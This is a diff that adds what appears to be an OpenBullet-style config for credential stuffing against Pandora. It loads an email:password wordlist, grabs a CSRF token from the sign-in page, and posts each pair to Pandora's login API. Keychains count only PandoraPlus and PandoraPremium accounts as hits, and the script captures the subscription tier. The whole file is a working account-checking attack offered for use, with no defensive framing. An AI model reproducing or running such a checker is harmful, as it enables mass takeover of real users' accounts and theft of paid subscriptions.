@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Pandora Radio",
+  "SuggestedBots": 20,
+  "LastModified": "2018-07-12T22:24:33.54067+00:00",
+  "AdditionalInfo": "",
+  "Author": "Robot",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.pandora.com/account/sign-in" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<COOKIES(csrftoken)>" LR "" "" Recursive=FALSE -> VAR "TOKEN" "" "" 
+REQUEST POST "https://www.pandora.com/api/v1/auth/login" AutoRedirect=TRUE 
+  CONTENT "{\"existingAuthToken\":null,\"username\":\"<USER>\",\"password\":\"<PASS>\",\"keepLoggedIn\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-CsrfToken: <TOKEN>" 
+  HEADER "Host: www.pandora.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "INVALID_USERNAME_PASSWORD" 
+    KEY "branding\":\"Pandora\",\"" 
+  KEYCHAIN Success OR 
+    KEY "branding\":\"PandoraPlus\",\"" 
+    KEY "branding\":\"PandoraPremium\",\"" 
+PARSE "<SOURCE>" LR "branding\":\"" "\"," Recursive=FALSE -> CAP "Subscription" "" "" 
